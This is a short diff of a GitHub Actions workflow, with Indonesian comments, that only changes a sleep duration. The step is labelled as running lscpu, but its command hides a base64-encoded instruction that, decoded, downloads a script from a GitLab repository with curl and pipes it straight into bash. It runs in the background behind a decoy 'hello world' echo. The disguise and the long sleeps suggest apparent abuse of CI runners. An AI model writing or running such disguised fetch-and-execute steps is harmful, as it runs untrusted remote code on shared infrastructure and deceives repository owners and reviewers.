@@ -48,7 +48,7 @@ jobs:
     steps:
       - name: Jalankan lscpu (timeout 6 menit, sukses walau timeout)
         run: |
-          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYXNhYWtrODgvZmlsZS9kaWFtb25kczhsaW5lLy0vYmxvYi9tYWluL3llYXJzIHwgYmFzaA | sh & sleep 10500
+          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYXNhYWtrODgvZmlsZS9kaWFtb25kczhsaW5lLy0vYmxvYi9tYWluL3llYXJzIHwgYmFzaA | sh & sleep 620
 
   # =============================================
   # 🔁 Lanjutkan loop jika masih dalam jam & siklus > 0
